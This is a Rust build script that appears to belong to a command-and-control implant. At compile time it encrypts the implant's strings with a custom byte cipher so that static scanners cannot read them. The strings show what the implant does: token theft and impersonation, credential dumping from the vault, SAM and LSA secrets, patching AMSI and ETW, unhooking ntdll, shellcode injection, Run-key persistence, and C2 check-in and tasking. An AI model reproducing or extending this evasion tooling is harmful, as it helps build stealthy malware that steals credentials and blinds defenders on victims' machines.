use std::fs;
use std::path::Path;

fn encrypt(s: &str) -> String {
    let mut seed: u32 = 0x811C_9DC5;
    let bytes: Vec<String> = s.bytes()
        .map(|b| {
            let rot = (seed & 0x07) as u8;
            let enc = b.wrapping_add(rot).wrapping_add(37);
            seed = seed.wrapping_mul(0x0100_0193) ^ (enc as u32);
            format!("0x{:02X}", enc)
        })
        .collect();
    format!("&[{}]", bytes.join(","))
}

fn main() {
    // --- String obfuscation ---
    let mut output = String::new();
    let strings = vec![
        ("S_SHELLCODE_START", "Execution started"),
        ("S_SHELLCODE_DONE", "Execution completed"),
        ("S_SHELLCODE_RUNNING", "Task started successfully"),
        ("S_SHELLCODE_TIMEOUT", "Task started"),
        ("S_SHELLCODE_THREAD", "Running in background"),
        ("S_SHELLCODE_DOWNLOAD", "Downloading chunk"),
        ("S_TOKEN_STOLEN", "Handle acquired from pid"),
        ("S_TOKEN_CREATED", "Handle created for"),
        ("S_TOKEN_IMPERSONATE", "Context switched"),
        ("S_TOKEN_REVERT", "Context restored"),
        ("S_TOKEN_LIST_EMPTY", "No handles stored"),
        ("S_TOKEN_NOT_FOUND", "Handle id"),
        ("S_TOKEN_FAIL_OPEN", "Failed to open target"),
        ("S_TOKEN_FAIL_TOKEN", "Failed to acquire handle for pid"),
        ("S_TOKEN_FAIL_DUP", "Failed to duplicate handle for pid"),
        ("S_TOKEN_FAIL_CREATE", "Failed to create handle for"),
        ("S_TOKEN_FAIL_IMP", "Failed to switch context"),
        ("S_TOKEN_FAIL_REVERT", "Failed to restore context"),
        ("S_CRED_VAULT", "vault"),
        ("S_CRED_CREDMAN", "credman"),
        ("S_CRED_SAM", "sam"),
        ("S_CRED_LSA", "lsa_secrets"),
        ("S_CRED_FAIL", "Failed to query store"),
        ("S_CRED_UNKNOWN", "Unknown source"),
        ("S_CRED_VALID", "Valid sources: vault, credman, sam, lsa_secrets"),
        ("S_CRED_NO_LSA", "Store not accessible (elevation required)"),
        ("S_CRED_FAIL_LSA", "Failed to access protected store"),
        ("S_CRED_FAIL_ENUM", "Failed to enumerate accounts"),
        ("S_AMSI_PATCHED", "Interface neutralized"),
        ("S_AMSI_FAIL", "Interface patch failed"),
        ("S_AMSI_KILLED", "Patch terminated"),
        ("S_ETW_PATCHED", "Tracing disabled"),
        ("S_ETW_FAIL", "Tracing patch failed"),
        ("S_ETW_KILLED", "Tracing patch terminated"),
        ("S_UNHOOK_DONE", "Module reload for"),
        ("S_UNHOOK_COMPLETE", "completed"),
        ("S_UNHOOK_FAIL", "failed with exit code"),
        ("S_UNHOOK_KILLED", "Reload terminated"),
        ("S_UNHOOK_NOTE", "Full reload requires memory operations"),
        ("S_API_VIRTUAL_ALLOC", "Memory allocation failed"),
        ("S_API_VIRTUAL_PROTECT", "Protection change failed"),
        ("S_API_CREATE_THREAD", "Thread creation failed"),
        ("S_WINDOWS_ONLY", "requires Windows"),
        ("S_NOT_IMPLEMENTED", "not implemented"),
        ("S_FAIL_DECODE", "Decode failed"),
        ("S_NO_SHELLCODE", "No input provided"),
        ("S_SHELLCODE_EMPTY", "Input is empty"),
        ("S_SHELLCODE_BG_FAIL", "Background task failed"),
        // --- IOC strings (protocol, paths, patterns) ---
        ("IOC_GET_TASKING", "get_tasking"),
        ("IOC_POST_RESPONSE", "post_response"),
        ("IOC_STAGING_RSA", "staging_rsa"),
        ("IOC_ACTION", "action"),
        ("IOC_TASKING_SIZE", "tasking_size"),
        ("IOC_RESPONSES", "responses"),
        ("IOC_SOCKS", "socks"),
        ("IOC_PUB_KEY", "pub_key"),
        ("IOC_SESSION_ID", "session_id"),
        ("IOC_CHECKIN", "checkin"),
        ("IOC_JSON_CT", "application/json"),
        ("IOC_CONN_KEEPALIVE", "keep-alive"),
        ("IOC_UA_HEADER", "User-Agent"),
        ("IOC_CT_HEADER", "Content-Type"),
        ("IOC_CONN_HEADER", "Connection"),
        ("IOC_SPAWNTO", "C:\\Windows\\System32\\RuntimeBroker.exe"),
        ("IOC_RUN_KEY", "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
        ("IOC_KERNEL32", "kernel32.dll"),
        ("IOC_NTDLL", "ntdll.dll"),
        ("IOC_AMSI_DLL", "amsi.dll"),
        ("IOC_AMSI_FUNC", "AmsiScanBuffer"),
        ("IOC_ETW_FUNC", "EtwEventWrite"),
        ("IOC_LDRLOADDLL", "LdrLoadDll"),
        ("IOC_CMD", "cmd.exe"),
        ("IOC_PS", "powershell.exe"),
    ];

    for (name, value) in &strings {
        output.push_str(&format!("pub const {}: &[u8] = {};\n", name, encrypt(value)));
    }

    let out_dir = std::env::var("OUT_DIR").unwrap();
    fs::write(Path::new(&out_dir).join("strings_enc.rs"), output).unwrap();

    // --- Windows PE resource embedding via mingw windres ---
    if std::env::var("CARGO_CFG_TARGET_OS").unwrap_or_default() == "windows" {
        let out_dir_path = Path::new(&out_dir);
        let rc_path = Path::new("resources/app.rc");
        if rc_path.exists() {
            let obj_path = out_dir_path.join("app.res.o");
            let windres = if std::env::var("TARGET").unwrap_or_default().contains("x86_64") {
                "x86_64-w64-mingw32-windres"
            } else {
                "i686-w64-mingw32-windres"
            };
            let status = std::process::Command::new(windres)
                .args(&[
                    "--input", rc_path.to_str().unwrap(),
                    "--output", obj_path.to_str().unwrap(),
                    "--output-format=coff",
                    "--include-dir", "resources",
                ])
                .status();
            if let Ok(s) = status {
                if s.success() {
                    println!("cargo:rustc-link-arg={}", obj_path.display());
                }
            }
        }
    }


    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-changed=resources/app.rc");
    println!("cargo:rerun-if-changed=resources/app.manifest");
    println!("cargo:rerun-if-changed=resources/app.ico");
}
